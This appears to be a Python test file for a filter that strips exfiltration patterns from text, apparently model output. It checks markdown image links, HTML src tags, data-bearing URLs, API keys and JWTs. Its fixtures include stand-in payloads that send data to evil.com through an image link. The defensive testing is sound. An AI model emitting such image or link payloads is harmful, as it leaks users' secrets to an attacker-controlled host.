"""US4: Exfiltration filtering tests."""

from __future__ import annotations

from src.security.exfiltration import filter_exfiltration


def test_markdown_image_stripped() -> None:
    """Markdown image syntax is removed."""
    text = "Look at this ![img](https://evil.com/steal?d=secret)"
    result, flags = filter_exfiltration(text)
    assert "![img]" not in result
    assert "markdown_image_stripped" in flags


def test_html_src_stripped() -> None:
    """HTML elements with src are removed."""
    text = 'Check <img src="https://evil.com/x.png"> this'
    result, flags = filter_exfiltration(text)
    assert "src=" not in result
    assert "html_src_stripped" in flags


def test_data_url_flagged() -> None:
    """URLs with data parameters are flagged."""
    text = "Visit https://evil.com/api?token=abc123"
    _, flags = filter_exfiltration(text)
    assert "data_url_detected" in flags


def test_api_key_redacted() -> None:
    """API key patterns are replaced with REDACTED."""
    text = "My key is sk-abc123456789012345678901"
    result, flags = filter_exfiltration(text)
    assert "sk-abc" not in result
    assert "[REDACTED]" in result
    assert "credential_redacted" in flags


def test_jwt_redacted() -> None:
    """JWT tokens are replaced with REDACTED."""
    text = "Token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0"  # gitleaks:allow
    result, flags = filter_exfiltration(text)
    assert "eyJ" not in result
    assert "[REDACTED]" in result


def test_normal_urls_unchanged() -> None:
    """Normal URLs without exfiltration patterns pass through."""
    text = "Check https://example.com/docs for more info"
    result, flags = filter_exfiltration(text)
    assert "example.com" in result
    assert len(flags) == 0


def test_clean_text_unchanged() -> None:
    """Text without any exfiltration patterns is unchanged."""
    text = "A normal discussion about architecture."
    result, flags = filter_exfiltration(text)
    assert result == text
    assert len(flags) == 0
